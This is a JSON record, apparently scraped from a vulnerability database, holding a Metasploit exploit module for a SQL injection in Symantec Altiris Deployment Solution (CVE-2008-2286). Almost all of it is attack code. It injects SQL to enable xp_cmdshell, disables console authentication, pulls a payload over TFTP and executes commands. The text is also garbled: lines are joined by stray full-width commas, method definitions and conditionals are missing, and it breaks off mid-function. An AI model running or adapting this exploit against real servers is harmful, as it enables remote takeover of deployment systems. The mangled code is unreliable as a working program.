{
    "text": "vul_name : Symantec Altiris DS SQL Injection ， vul_cve : CVE-2008-2286 ， vul_poc :  ，  # This file is part of the Metasploit Framework and may be subject to ，  # redistribution and commercial restrictions. Please see the Metasploit ，  # Framework web site for more information on licensing and terms of use. ， require 'msf/core' ， class Metasploit3 < Msf : Exploit : Remote ， Rank = NormalRanking ， include Msf : Exploit : CmdStagerTFTP ， include Msf : Exploit : Remote : Tcp ， super ( update_info ( info ,  ， 'Name' => 'Symantec Altiris DS SQL Injection' ,  ， 'Description' => %q{ ， This module exploits a SQL injection flaw in Symantec Altiris Deployment Solution 6.8 ， to 6.9.164. The vulnerability exists on axengine.exe which fails to adequately sanitize ， numeric input fields in \"UpdateComputer\" notification Requests. In order to spawn a shell ,  ， several SQL injections are required in close succession , first to enable xp_cmdshell , then ， retrieve the payload via TFTP and finally execute it. The module also has the capability ， to disable or enable local application authentication. In order to work the target system ， must have a tftp client available. ， } ,  ， 'Author' => ，  [  ， 'Brett Moore' ,  # Vulnerability discovery ， '3v0lver' # Metasploit module ，  ]  ,  ， 'License' => MSF_LICENSE ,  ， ' ，  [  ，  [ 'CVE' , '2008-2286' ]  ,  ，  [ 'OSVDB' , '45313' ]  ,  ，  [ 'BID' , '29198' ]  ,  ，  [ 'URL' , ' ]  ，  ]  ,  ， 'DefaultOptions' => ， { ， 'EXITFUNC' => 'process' ,  ， } ,  ， 'Targets' => ，  [  ，  [ 'Windows 2003 ( with tftp client available ) ' ,  ， { ， 'Arch' => ARCH_X86 ,  ， 'Platform' => 'win' ， } ，  ]  ，  ]  ,  ， 'Privileged' => true ,  ， 'Platform' => 'win' ,  ， 'DisclosureDate' => 'May 15 2008' ,  ， 'DefaultTarget' => 0 )  ， register_options (  ，  [  ， Opt : RPORT ( 402 )  ,  ， OptBool.new ( 'XP_CMDSHELL' ,  [ true , \"Enable xp_cmdshell prior to exploit\" , true ]  )  ,  ， OptBool.new ( 'DISABLE_SECURITY' ,  [ true , \"Exploit SQLi to execute wc_upd_disable_security and disable Console Authentication\" , false ]  )  ,  ， OptBool.new ( 'ENABLE_SECURITY' ,  [ true , \"Enable Local Deployment Console Authentication\" , false ]  )  ，  ]  , self.class )  ， end ， inject= [  ]  ， inject+= [  ， \" # {Rex : Text.to_hex ( \"sp_configure \\\"show advanced options\\\" , 1 ; reconfigure\" , ' ) }\" ,  ， \" # {Rex : Text.to_hex ( \"sp_configure \\\"xp_cmdshell\\\" , 1 ; reconfigure\" , ' ) }\" ,  ，  ]  ，  @ xp_shell_enable = false ， end ， inject+= [ \" # {Rex : Text.to_hex ( \"wc_upd_disable_security\" , ' ) }\" ]  ，  @ wc_disable_security = false ， end ， inject+= [ \" # {Rex : Text.to_hex ( \"wc_upd_enable_security\" , ' ) }\" ]  ，  @ wc_enable_security = false ， end ， inject+= [ \" # {Rex : Text.to_hex ( \"master.dbo.xp_cmdshell \\'cd %TEMP% cmd.exe /c # {cmd}\\'\" , ' ) }\" ] if cmd ! = nil ， inject.each do | sqli |  ， send_update_computer ( \"2659 , null , null ; declare @ querya VARCHAR ( 255 )  ; select @ querya = 0x # {sqli} ; exec (  @ querya )  ; -\" )  ， end ， end ， notification = %Q | Request=UpdateComputer ， OS-Bit=32 ， CPU-Arch=x86 ， IP-Address=192.168.20.107 ， MAC-Address=005056C000AB ， Name=Remove_test ， OS=Windows XP ， Version=2.6-38 ( 32-Bit )  ， LoggedIn=Yes ， Boot-Env=Automation ， Platform=Linux ， Agent-Settings=Same ， Sys-Info-TimeZoneBias=0 ， Processor=Genuine Intel Intel ( R ) Core ( TM ) i7 CPU M 620 @ 2.67GHz ， Processor-Speed= # {processor_speed} ， \\x00 ， connect ， sock.put ( notification )  ， response = sock.get_once (  )  ， disconnect ， end ， def check ， res = send_update_computer ( \"2659\" )  ， unless res and res = ~ /Result=Success/ and res= ~ /DSVersion= ( . *  ) /",
    "time": "2013.11.09"
}